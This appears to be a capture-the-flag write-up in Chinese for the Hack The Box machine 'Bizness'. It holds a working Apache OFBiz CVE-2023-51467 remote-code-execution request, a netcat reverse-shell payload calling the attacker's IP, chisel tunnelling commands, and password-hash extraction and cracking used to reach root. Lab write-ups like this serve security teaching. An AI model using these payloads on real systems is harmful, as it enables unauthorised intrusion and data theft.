
```
┌──(root㉿kali)-[~]
└─# nmap -p- --open -Pn 10.10.11.252          
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-21 21:31 EST
Nmap scan report for 10.10.11.252
Host is up (0.28s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
43625/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 79.41 seconds
                                                                                                                    
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A 10.10.11.252 -p 22,80,443,43625
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-21 21:33 EST
Nmap scan report for 10.10.11.252
Host is up (0.35s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)
|   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)
|_  256 b06fa00a9edfb17a497886b23540ec95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
43625/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   225.85 ms 10.10.16.1
2   393.82 ms 10.10.11.252

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.99 seconds

```


# 写域名
```
echo "10.10.11.252 bizness.htb">> /etc/hosts
```


# web

```
┌──(root㉿kali)-[~]
└─# python3 /root/dirsearch/dirsearch.py -u https://bizness.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10929

Output File: /root/dirsearch/reports/bizness.htb/-_24-02-21_21-37-28.txt

Error Log: /root/dirsearch/logs/errors-24-02-21_21-37-28.log

Target: https://bizness.htb/

[21:37:30] Starting: 
[21:38:06] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/  
[21:38:40] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/        
[21:38:41] 400 -  157B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[21:38:45] 302 -    0B  - /common  ->  https://bizness.htb/common/          
                       
[21:38:49] 302 -    0B  - /content  ->  https://bizness.htb/content/        
[21:38:49] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[21:38:49] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[21:38:53] 200 -   34KB - /control                                          
[21:38:53] 200 -   34KB - /control/                                                                            
[21:39:00] 302 -    0B  - /error  ->  https://bizness.htb/error/;jsessionid=B093A088B8D317F7ED260369585D581B.jvm1
[21:39:00] 404 -  761B  - /error/                                           
[21:39:01] 302 -    0B  - /example  ->  https://bizness.htb/example/        
[21:39:12] 404 -  762B  - /images/                                          
[21:39:12] 404 -  769B  - /images/Sym.php                                   
[21:39:12] 404 -  769B  - /images/c99.php
[21:39:12] 302 -    0B  - /images  ->  https://bizness.htb/images/
[21:39:12] 404 -  768B  - /images/README                                    
[21:39:14] 200 -   27KB - /index.html                                       
[21:39:15] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main  
[21:40:01] 200 -   21B  - /solr/admin/                                      
[21:40:02] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml    
```

# vhost爆破没发现

# CVE-2023-51467

[参考这篇文章](https://www.cnblogs.com/CVE-Lemon/p/17962663)

以下payload可以获取一个rce，执行id命令

```
POST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
Host: bizness.htb
Cookie: JSESSIONID=B34E8E7780C88513D96CBB7A9884DD82.jvm1; JSESSIONID=77460DA68C4799389DE8EE2D895D80B2.jvm1; OFBiz.Visitor=10602
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://bizness.htb/solr/control/checkLogin/
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: https://bizness.htb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

groovyProgram=throw+new+Exception('id'.execute().text);
```

下面payload拿到revshell

```
groovyProgram=throw+new+Exception('nc -c bash 10.10.16.3 443'.execute().text);
```

拿到shell
```
┌──(root㉿kali)-[~/htb/Bizness]
└─# nc -lnvp 443                              
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.252] 41310
whoami
ofbiz
python3 -c "__import__('pty').spawn('/bin/bash')"
ofbiz@bizness:/opt/ofbiz$ id    
id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)

```

flag
```
ofbiz@bizness:/opt/ofbiz$ cd ~
cd ~
ofbiz@bizness:~$ ls
ls
user.txt
ofbiz@bizness:~$ cat user.txt
cat user.txt
4d99b9d111931e7dfcf910f7684a3c82
ofbiz@bizness:~$ 

```

# 提权

linpeas枚举

可写的可执行文件
```
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                              
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew                                        
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew

```

端口
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                            
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                                                                        
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:8443          :::*                    LISTEN      851/java            
tcp6       0      0 127.0.0.1:10523         :::*                    LISTEN      851/java            
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      851/java            
tcp6       0      0 :::43625                :::*                    LISTEN      721/java            
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      851/java            
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -    
```


### chisel配置动态端口转发

kali执行
```
./chisel server -p 53 --reverse
```

客户端执行
```
./chisel client 10.10.16.3:53 R:socks
```


```
┌──(root㉿kali)-[~/htb/Bizness]
└─# proxychains -q nmap 127.0.0.1 -sV -Pn -A -p 8443,10523,8009,8080
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-22 01:22 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000088s latency).

PORT      STATE  SERVICE    VERSION
8009/tcp  closed ajp13
8080/tcp  open   http-proxy
|_http-title: BizNess Incorporated
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID=F2E32F42AD5FD9BC2B61B8669F0FA1CF.jvm1; Path=/; HttpOnly
|     Accept-Ranges: bytes
|     ETag: W/"27200-1702887508516"
|     Last-Modified: Mon, 18 Dec 2023 08:18:28 GMT
|     vary: accept-encoding
|     Content-Type: text/html
|     Content-Length: 27200
|     Date: Thu, 22 Feb 2024 06:22:55 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>BizNess Incorporated</title>
|     <meta content="width=device-width, initial-scale=1.0" name="viewport">
|     <meta content="" name="keywords">
|     <meta content="" name="description">
|     <!-- Favicons -->
|     <link href="img/favicon.png" rel="icon">
|     <link href="img/apple-touch-icon.png" rel="apple-touch-icon">
|     <!-- Google Fonts -->
|     <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,700,700i|Montserrat:300,400,500,700" rel="stylesheet">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID=F65ACF72AA3E2677D72D09AFD12D427C.jvm1; Path=/; HttpOnly; SameSite=strict
|     Allow: OPTIONS, GET, HEAD, POST
|     Content-Length: 0
|     Date: Thu, 22 Feb 2024 06:22:56 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1925
|     Date: Thu, 22 Feb 2024 06:23:02 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp  closed https-alt
10523/tcp closed unknown

```


上面的http站点同样运行ofbiz，但是无法执行rce


# 敏感文件

一个密码哈希
```
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$  grep -arin -0 -E '(\w+\W+){0,5}password(\W+\w+){0,5}' c54d0.dat
<0 -E '(\w+\W+){0,5}password(\W+\w+){0,5}' c54d0.dat    
21:                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ 

```

使用[这个解密脚本](https://github.com/IamLucif3r/Go-Hash-Matcher?source=post_page-----68713a41f98b--------------------------------)

```
┌──(root㉿kali)-[~/htb/Bizness/Go-Hash-Matcher]
└─# go run main.go
Checking passwords ⠦[✅] Hash Matched! Password Found : monkeybizness, hash: $SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I

```

密码是：monkeybizness


flag
```
ofbiz@bizness:~$ su 
su
Password: monkeybizness

root@bizness:/home/ofbiz# cat /root/root.txt
cat /root/root.txt
e9500f79232e601074ad2e303e063fe8
root@bizness:/home/ofbiz# 

```